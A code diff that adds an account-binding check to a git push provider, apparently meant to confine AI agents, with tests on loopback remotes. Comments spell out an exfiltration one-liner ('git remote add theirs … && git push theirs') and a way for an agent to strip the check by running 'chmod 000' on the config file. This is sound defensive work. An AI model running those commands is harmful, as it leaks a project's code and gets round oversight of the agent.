@@ -31,6 +31,7 @@
 //! another one. Cloudflare's §13.4 scoped tokens are the case `mint` exists
 //! for.
 
+use apex_secret_core::identity;
 use apex_secret_core::operation::{
     self, Effect, OperationSpec, ParamSpec, ProviderSpec, ResourceKind, Syntax,
 };
@@ -243,13 +244,61 @@ impl Provider for GitProvider {
     fn bind(&self, req: &Bind<'_>) -> Result<Bound, ProviderError> {
         let op = GitProvider::op(req)?;
         let url = broker::resolve_url(req.project, &op, req.owner)?;
+
+        // §36, P2-013: which account this project may act as.
+        //
+        // Checked HERE, between resolving the remote and handing anything to
+        // the framework, because this is the only moment at which both the
+        // project and the URL a NAME turned into are in hand. The remote is
+        // whatever the repository's own config says it is, and an agent can
+        // write that config — so `git remote add theirs https://github.com/
+        // someone/else.git && git push theirs` is a one-line exfiltration of
+        // the project's code unless something compares the two.
+        //
+        // A project with no `apex.toml` binds nothing and is unchanged.
+        // Anything else that goes wrong reading it REFUSES: a file that could
+        // not be read is not a file that says nothing, and treating it as
+        // unbound is how an agent that can `chmod 000 apex.toml` would take
+        // the check away.
+        let identities = identity::Identities::read_or_unbound(
+            std::path::Path::new(req.project),
+            req.owner.uid,
+            &req.owner.name,
+        )
+        .map_err(|e| {
+            ProviderError::Refused(format!(
+                "this project's apex.toml could not be read, so which account \
+                 it is bound to is unknown, and this build will not push or \
+                 fetch as an account it cannot check: {e}"
+            ))
+        })?;
+        if let Some(github) = &identities.github {
+            github
+                .check(&url)
+                .map_err(|e| ProviderError::Refused(e.to_string()))?;
+        }
+
         let endpoint = Endpoint::from_url(&url).map_err(|e| {
             // The framework says a destination is not http; git is the layer
             // that knows why somebody hit this, which is an ssh remote.
+            //
+            // §36's `[identity.ssh] host_group` is named here when the project
+            // has one, because this is the only place an ssh remote is spoken
+            // about at all — and a binding nothing enforces should at least
+            // appear where the thing it describes is refused.
+            let bound = match &identities.ssh_host_group {
+                Some(group) => format!(
+                    ". This project binds [identity.ssh] host_group = \"{}\", \
+                     which nothing in this build checks — there is no ssh \
+                     provider for it to constrain",
+                    group.escape_debug()
+                ),
+                None => String::new(),
+            };
             ProviderError::Refused(format!(
                 "{e} — that remote is not an http remote, so a stored token is \
                  not how it authenticates. An ssh remote uses your ssh agent, \
-                 which a confined session cannot reach, by design"
+                 which a confined session cannot reach, by design{bound}"
             ))
         })?;
         Ok(Bound {
@@ -405,6 +454,178 @@ mod tests {
             GitProvider::op(&req),
             Err(GitError::BadBranchName(_))
         ));
+    }
+
+    // ── §36 / P2-013: which account this project may push as ────────────────
+    //
+    // A real repository with two remotes, and an `apex.toml` beside it. The
+    // host in the binding is `127.0.0.1` rather than `github.com` for the
+    // reason `GitHubIdentity::host` exists: a check that could only be
+    // exercised against the real github.com could not be exercised at all.
+
+    struct Repo {
+        dir: tempfile::TempDir,
+    }
+
+    impl Repo {
+        /// A git repository with `ours` and `theirs` remotes on loopback.
+        ///
+        /// Port 9 (`discard`) is closed on every machine, so nothing here can
+        /// reach a network even if a test were wrong.
+        fn new() -> Repo {
+            let dir = tempfile::Builder::new()
+                .prefix("apex-git-identity-")
+                .tempdir_in("/var/tmp")
+                .expect("a fixture under /var/tmp");
+            let run = |args: &[&str]| {
+                let status = std::process::Command::new("git")
+                    .args(args)
+                    .current_dir(dir.path())
+                    .stdout(std::process::Stdio::null())
+                    .stderr(std::process::Stdio::null())
+                    .status()
+                    .expect("git runs");
+                assert!(status.success(), "git {args:?}");
+            };
+            run(&["init", "-q"]);
+            run(&["remote", "add", "ours", "http://127.0.0.1:9/acme/widgets.git"]);
+            run(&[
+                "remote",
+                "add",
+                "theirs",
+                "http://127.0.0.1:9/someone-else/widgets.git",
+            ]);
+            run(&["remote", "add", "viassh", "git@127.0.0.1:acme/widgets.git"]);
+            Repo { dir }
+        }
+
+        fn binds(&self, text: &str) {
+            std::fs::write(self.dir.path().join("apex.toml"), text).expect("apex.toml");
+        }
+
+        fn bind_remote(&self, remote: &str) -> Result<Bound, ProviderError> {
+            let owner = broker::owner(unsafe { libc::getuid() }).expect("own uid");
+            let info = service();
+            let p = Params::new();
+            let req = Bind {
+                operation: SPEC.operation("git.push").unwrap(),
+                resource: remote,
+                params: &p,
+                body: &[],
+                project: self.dir.path().to_str().expect("utf8"),
+                service: &info,
+                owner: &owner,
+                audit_id: "test",
+            };
+            GitProvider.bind(&req)
+        }
+    }
+
+    const BINDS_ACME: &str =
+        "[identity.github]\naccount = \"acme\"\nhost = \"127.0.0.1\"\n";
+
+    #[test]
+    fn a_remote_belonging_to_the_account_this_project_binds_is_allowed() {
+        let repo = Repo::new();
+        repo.binds(BINDS_ACME);
+        assert!(repo.bind_remote("ours").is_ok());
+    }
+
+    /// §36's sentence, made true. An agent can write `.git/config`, so
+    /// `git remote add theirs https://…/someone/else.git && git push theirs`
+    /// is a one-line exfiltration of the project's code unless something
+    /// compares the remote with what the project bound.
+    #[test]
+    fn a_remote_belonging_to_an_account_this_project_did_not_bind_is_refused() {
+        let repo = Repo::new();
+        repo.binds(BINDS_ACME);
+        let err = repo.bind_remote("theirs").expect_err("refused");
+        let ProviderError::Refused(why) = &err else {
+            panic!("refused with the wrong kind: {err:?}");
+        };
+        assert!(why.contains("someone-else"), "{why}");
+        assert!(why.contains("acme"), "{why}");
+        assert!(why.contains("wrong account"), "{why}");
+    }
+
+    /// Backwards compatibility, asserted rather than argued: every repository
+    /// in this workspace's other tests has no `apex.toml`.
+    #[test]
+    fn a_project_with_no_apex_toml_is_unconstrained() {
+        let repo = Repo::new();
+        assert!(repo.bind_remote("ours").is_ok());
+        assert!(
+            repo.bind_remote("theirs").is_ok(),
+            "a project that binds nothing was constrained anyway"
+        );
+    }
+
+    #[test]
+    fn a_project_whose_apex_toml_binds_no_github_account_is_unconstrained() {
+        let repo = Repo::new();
+        repo.binds("[cloudflare]\nzone = \"example.com\"\n");
+        assert!(repo.bind_remote("theirs").is_ok());
+    }
+
+    /// A file that could not be read is not a file that says nothing. Treating
+    /// it as unbound is how an agent that can `chmod 000 apex.toml` would take
+    /// the check away.
+    #[test]
+    fn an_unreadable_apex_toml_refuses_rather_than_acting_as_an_unknown_account() {
+        use std::os::unix::fs::PermissionsExt;
+        if unsafe { libc::geteuid() } == 0 {
+            eprintln!(
+                "SKIP  an_unreadable_apex_toml_refuses_rather_than_acting_as_an_unknown_account: \
+                 running as root, which mode bits do not stop. NOT ASSERTED: that \
+                 a project file the kernel refuses stops a push rather than \
+                 leaving it unconstrained."
+            );
+            return;
+        }
+        let repo = Repo::new();
+        repo.binds(BINDS_ACME);
+        let path = repo.dir.path().join("apex.toml");
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).expect("chmod");
+        let got = repo.bind_remote("theirs");
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).expect("chmod");
+
+        let err = got.map(|_| ()).expect_err("an unreadable binding refuses");
+        let ProviderError::Refused(why) = &err else {
+            panic!("{err:?}");
+        };
+        assert!(
+            why.contains("will not push or fetch as an account it cannot check"),
+            "{why}"
+        );
+    }
+
+    /// A binding nothing enforces should at least appear where the thing it
+    /// describes is refused.
+    #[test]
+    fn an_ssh_remote_is_still_refused_and_names_the_host_group_the_project_bound() {
+        let repo = Repo::new();
+        repo.binds("[identity.ssh]\nhost_group = \"robotics\"\n");
+        let err = repo.bind_remote("viassh").expect_err("ssh is refused");
+        let ProviderError::Refused(why) = &err else {
+            panic!("{err:?}");
+        };
+        assert!(why.contains("ssh agent"), "{why}");
+        assert!(why.contains("robotics"), "the bound host group is not named: {why}");
+        assert!(
+            why.contains("nothing in this build checks"),
+            "a binding nothing enforces must say so: {why}"
+        );
+    }
+
+    #[test]
+    fn an_ssh_remote_with_no_binding_is_refused_the_way_it_always_was() {
+        let repo = Repo::new();
+        let err = repo.bind_remote("viassh").expect_err("ssh is refused");
+        let ProviderError::Refused(why) = &err else {
+            panic!("{err:?}");
+        };
+        assert!(why.contains("ssh agent"), "{why}");
+        assert!(!why.contains("host_group"), "{why}");
     }
 
     #[test]
